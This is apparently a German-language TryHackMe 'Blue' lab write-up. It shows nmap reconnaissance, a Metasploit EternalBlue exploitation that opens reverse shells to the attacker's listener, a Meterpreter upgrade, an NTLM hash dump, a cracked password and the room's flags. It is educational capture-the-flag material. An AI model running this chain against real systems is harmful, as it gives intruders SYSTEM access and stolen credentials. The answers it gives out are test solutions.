# Blue
## Task 1: Recon
```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.212.222 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-26 06:38 EST
Nmap scan report for 10.10.212.222
Host is up (0.032s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2023-02-26T11:40:06+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2023-02-25T11:34:00
|_Not valid after:  2023-08-27T11:34:00
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2023-02-26T11:40:00+00:00
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h12m00s, deviation: 2h41m00s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:b5:e4:0f:88:1b (unknown)
| smb2-time: 
|   date: 2023-02-26T11:40:01
|_  start_date: 2023-02-26T11:33:59
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-02-26T05:40:00-06:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.60 seconds
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ 
```

### SMB Enumeration
Auf dem System wird SMBv1 verwendet, welches verwundbar gegenueber EternalBlue (MS17-010) ist. 
```
┌──(kali㉿kali)-[~]
└─$ nmap --script "smb-protocols or smb-vuln-ms17-010" -p 445 10.10.212.222
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-26 07:24 EST
Nmap scan report for 10.10.212.222
Host is up (0.032s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.0.2
|_    2.1

Nmap done: 1 IP address (1 host up) scanned in 13.85 seconds
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ 
```

```
msf6 > search smb_version

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version

msf6 > use 0
msf6 auxiliary(scanner/smb/smb_version) > 
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.10.212.222
RHOSTS => 10.10.212.222
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.10.212.222:445     - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:40m 42s) (guid:{0ecb0237-b219-4ada-bad5-300e0d08c696}) (authentication domain:JON-PC)
[+] 10.10.212.222:445     -   Host is running Windows 7 Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP)
[*] 10.10.212.222:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) > 
```

## Task 2: Gain Access
Metasploit benutzen um EternalBlue zu verwenden
```
msf6 auxiliary(scanner/smb/smb_version) > search type:exploit eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 auxiliary(scanner/smb/smb_version) > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show info

       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     Module: exploit/windows/smb/ms17_010_eternalblue
   Platform: Windows
       Arch: x64
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Average
  Disclosed: 2017-03-14

Provided by:
  Equation Group
  Shadow Brokers
  sleepya
  Sean Dillon <sean.dillon@risksense.com>
  Dylan Davis <dylan.davis@risksense.com>
  thelightcosine
  wvu <wvu@metasploit.com>
  agalway-r7
  cdelafuente-r7
  cdelafuente-r7
  agalway-r7

Available targets:
  Id  Name
  --  ----
  0   Automatic Target
  1   Windows 7
  2   Windows Embedded Standard 7
  3   Windows Server 2008 R2
  4   Windows 8
  5   Windows 8.1
  6   Windows Server 2012
  7   Windows 10 Pro
  8   Windows 10 Enterprise Evaluation

Check supported:
  Yes

Basic options:
  Name           Current Setting  Required  Description
  ----           ---------------  --------  -----------
  RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  RPORT          445              yes       The target port (TCP)
  SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
  SMBPass                         no        (Optional) The password for the specified username
  SMBUser                         no        (Optional) The username to authenticate as
  VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
  VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.

Payload information:
  Space: 2000

Description:
  This module is a port of the Equation Group ETERNALBLUE exploit, 
  part of the FuzzBunch toolkit released by Shadow Brokers. There is a 
  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is 
  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error 
  where a DWORD is subtracted into a WORD. The kernel pool is groomed 
  so that overflow is well laid-out to overwrite an SMBv1 buffer. 
  Actual RIP hijack is later completed in 
  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may 
  not trigger 100% of the time, and should be run continuously until 
  triggered. It seems like the pool will get hot streaks and need a 
  cool down period before the shells rain in again. The module will 
  attempt to use Anonymous login, by default, to authenticate to 
  perform the exploit. If the user supplies credentials in the 
  SMBUser, SMBPass, and SMBDomain options it will use those instead. 
  On some systems, this module may cause system instability and 
  crashes, such as a BSOD or a reboot. This may be more likely with 
  some payloads.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
  https://nvd.nist.gov/vuln/detail/CVE-2017-0144
  https://nvd.nist.gov/vuln/detail/CVE-2017-0145
  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
  https://nvd.nist.gov/vuln/detail/CVE-2017-0148
  https://github.com/RiskSense-Ops/MS17-010
  https://risksense.com/wp-content/uploads/2018/05/White-Paper_Eternal-Blue.pdf
  https://www.exploit-db.com/exploits/42030

Also known as:
  ETERNALBLUE

msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.212.222
rhosts => 10.10.212.222
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.9.45.203:4444 
[*] 10.10.212.222:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.212.222:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.212.222:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.212.222:445 - The target is vulnerable.
[*] 10.10.212.222:445 - Connecting to target for exploitation.
[+] 10.10.212.222:445 - Connection established for exploitation.
[+] 10.10.212.222:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.212.222:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.212.222:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.212.222:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.212.222:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.212.222:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.212.222:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.212.222:445 - Sending all but last fragment of exploit packet
[*] 10.10.212.222:445 - Starting non-paged pool grooming
[+] 10.10.212.222:445 - Sending SMBv2 buffers
[+] 10.10.212.222:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.212.222:445 - Sending final SMBv2 buffers.
[*] 10.10.212.222:445 - Sending last fragment of exploit packet!
[*] 10.10.212.222:445 - Receiving response from exploit packet
[+] 10.10.212.222:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.212.222:445 - Sending egg to corrupted connection.
[*] 10.10.212.222:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.212.222
[*] Command shell session 1 opened (10.9.45.203:4444 -> 10.10.212.222:49290 ) at 2023-02-26 08:24:21 -0500
[+] 10.10.212.222:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.212.222:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.212.222:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
```

## Task 3: Escalate
Upgrade Shell zu Meterpreter Shell (alternativ haette man auch direkt Meterpreter waehlen koennen)
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

msf6 exploit(windows/smb/ms17_010_eternalblue) > use 0
msf6 post(multi/manage/shell_to_meterpreter) > show info

       Name: Shell to Meterpreter Upgrade
     Module: post/multi/manage/shell_to_meterpreter
   Platform: Linux, OSX, Unix, Solaris, BSD, Windows
       Arch: 
       Rank: Normal

Provided by:
  Tom Sellers <tom@fadedcode.net>

Compatible session types:
  Shell

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
  LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
  LPORT    4433             yes       Port for payload to connect to.
  SESSION                   yes       The session to run this module on

Description:
  This module attempts to upgrade a command shell to meterpreter. The 
  shell platform is automatically detected and the best version of 
  meterpreter for the target is selected. Currently 
  meterpreter/reverse_tcp is used on Windows and Linux, with 
  'python/meterpreter/reverse_tcp' used on all others.

msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type               Information                                               Connection
  --  ----  ----               -----------                                               ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.9.45.203:4444 -> 10.10.212.222:49290  (10.10.212.222)

msf6 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.9.45.203:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (200262 bytes) to 10.10.212.222
[*] Meterpreter session 2 opened (10.9.45.203:4433 -> 10.10.212.222:49302 ) at 2023-02-26 08:35:18 -0500
[*] Stopping exploit/multi/handler

msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                                               Connection
  --  ----  ----                     -----------                                               ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.9.45.203:4444 -> 10.10.212.222:49290  (10.10.212.222)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              10.9.45.203:4433 -> 10.10.212.222:49302  (10.10.212.222)

msf6 post(multi/manage/shell_to_meterpreter) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                                               Connection
  --  ----  ----                     -----------                                               ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.9.45.203:4444 -> 10.10.212.222:49290  (10.10.212.222)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              10.9.45.203:4433 -> 10.10.212.222:49302  (10.10.212.222)

msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > 
```

### Meterpreter
```
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > shell
Process 1104 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>^Z
Background channel 1? [y/N]  y

meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 432   660   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 488   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 564   552   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 612   552   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 620   604   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 660   604   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 704   564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 708   612   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 716   612   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 724   612   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 776   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 832   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 900   708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 948   708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1076  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1176  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1304  708   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1340  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1400  708   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1412  832   WmiPrvSE.exe
 1476  708   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1616  708   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1916  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2324  1304  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 2328  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2356  708   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2492  708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2568  708   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2704  708   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 2868  2324  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 3024  708   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM

meterpreter > migrate 2704
[*] Migrating from 1304 to 2704...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > migrate 2568
[*] Migrating from 1304 to 2568...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > migrate 2492
[*] Migrating from 1304 to 2492...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > migrate 2868
[*] Migrating from 1304 to 2868...
[*] Migration completed successfully.
meterpreter > 
```

## Task 4: Cracking
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter > 
```
- 1st field: username
- 2nd field: Relative Identification (RID): last 3-4 digits of the Security Identifier (SID), which are unique to each user
- 3rd field: LM hash
- 4th field: NTLM hash

### Crack the NTLM Hash
Das Kennwort lautet **alqfna22**
```
 root  …  tryhackme  writeups  CrackTheHash  1  john --format=NT --wordlist=rockyou.txt test
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (?)
1g 0:00:00:00 DONE (2023-02-26 14:56) 1.587g/s 16191Kp/s 16191Kc/s 16191KC/s alqueva1968..alpus
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
 root  …  tryhackme  writeups  CrackTheHash  1  cat test
ffb43f0de35be4d9917ac0cc8ad57f8d
 root  …  tryhackme  writeups  CrackTheHash  1  john --show --format=NT test                                                                1 
?:alqfna22

1 password hash cracked, 0 left
 root  …  tryhackme  writeups  CrackTheHash  1  tail john.pot
[...]
$NT$ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
 root  …  tryhackme  writeups  CrackTheHash  1  
```

Oder auch mit dem gesamten Hash
```
 root  …  tryhackme  writeups  Blue  1  john --format=NT --wordlist=../CrackTheHash/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
No password hashes left to crack (see FAQ)
 root  …  tryhackme  writeups  Blue  1  john --show --format=NT hash
Jon:alqfna22:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

1 password hash cracked, 0 left
 root  …  tryhackme  writeups  Blue  1  
```

Alternativ kann der Hash auch mit _https://crackstation.net/_ gecrackt werden.

## Task 5: Find flags!
Um die Flags zu finden startet man eine Shell und sucht mit den entsprechendem cmd Befehl nach den Files
```
C:\>dir /s *flag*
dir /s *flag*
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  01:27 PM                24 flag1.txt
               1 File(s)             24 bytes

 Directory of C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent

03/17/2019  01:26 PM               482 flag1.lnk
03/17/2019  01:30 PM               848 flag2.lnk
03/17/2019  01:32 PM             2,344 flag3.lnk
               3 File(s)          3,674 bytes

 Directory of C:\Users\Jon\Documents

03/17/2019  01:26 PM                37 flag3.txt
               1 File(s)             37 bytes

 Directory of C:\Windows\System32\config

03/17/2019  01:32 PM                34 flag2.txt
               1 File(s)             34 bytes

     Total Files Listed:
               6 File(s)          3,769 bytes
               0 Dir(s)  20,485,476,352 bytes free

C:\>
C:\>type flag1.txt
type flag1.txt
flag{access_the_machine}

C:\>type Windows\System32\config\flag2.txt
type Windows\System32\config\flag2.txt
flag{sam_database_elevated_access}

C:\>type Users\Jon\Documents\flag3.txt
type Users\Jon\Documents\flag3.txt
flag{admin_documents_can_be_valuable}

C:\>
```
